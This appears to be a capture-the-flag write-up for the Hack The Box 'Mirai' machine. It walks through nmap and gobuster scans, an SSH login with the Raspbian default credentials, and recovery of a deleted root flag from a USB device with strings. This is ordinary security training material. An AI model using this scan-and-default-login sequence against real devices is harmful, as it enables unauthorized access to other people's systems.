<center><h1>Mirai</h1></center>
<br>
<center><h3>Summary</h3></center>
<br><br>
First we start with an nmap scan.
```
# nmap -sC -sV -T4 -p- 10.10.10.48
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-17 20:17 EDT
Nmap scan report for 10.10.10.48
Host is up (0.056s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
1315/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
|_http-title: Unauthorized
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.24 seconds
```
So there are a few ports open but we want port 80. Initially when you navigate to <b>http://10.10.10.48</b> you get nothing but a blank screen. Seeing this, I decided to run a gobuster
```
# gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/d
irbuster/directory-list-2.3-small.txt -x php,txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.48
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2019/09/17 20:25:10 Starting gobuster
===============================================================
/admin (Status: 301)
```
Only found one directory. If you go to that page you will be greated with the Pi-Hole Admin Console. This is basically an Ad Blocker running on a Raspberry Pi

<center><img src="/htb/mirai/dashboard.png"></center>
<br>
I didn't find much more on the webpage. Now my next idea was to try SSH. I no knew that is was running Raspian which has default credentials of user <b>pi</b> pass <b>raspberry</b>.
```
# ssh pi@10.10.10.48
pi@10.10.10.48's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 18 00:37:37 2019 from 10.10.14.21

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $
```
And we are in. We can grab the user flag now located at <b>/home/pi/Desktop</b>
```
pi@raspberrypi:~ $ ls Desktop/
Plex  user.txt
```
Now for root. If we run <b>sudo -l</b> we can see that we have full sudo privileges. Problem is when we try to read the root flag we get this message
```
pi@raspberrypi:~ $ sudo cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```
Looks like we are not done just yet. So the message hints at a USB. If you run <b>lsblk</b> you will see that there is a usb mount at <b>/media/usbstick</b>
```
# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk
├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom  
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
```
If you <b>cd</b> in to directory you will see a <b>damnit.txt</b> file. If you read that you will get another message that the root flag was accidentally deleted.
```
# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```
The message basically tells us that the root flag is still on the USB just hidden. To find the root flag just use the <b>strings</b> command against <b>/dev/sdb</b> since thats the actual USB
```
# sudo strings /dev/sdb
<output omitted>
root.txt
damnit.txt
>r &
3d3e483143ff12e**************
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```
<br><br><br>
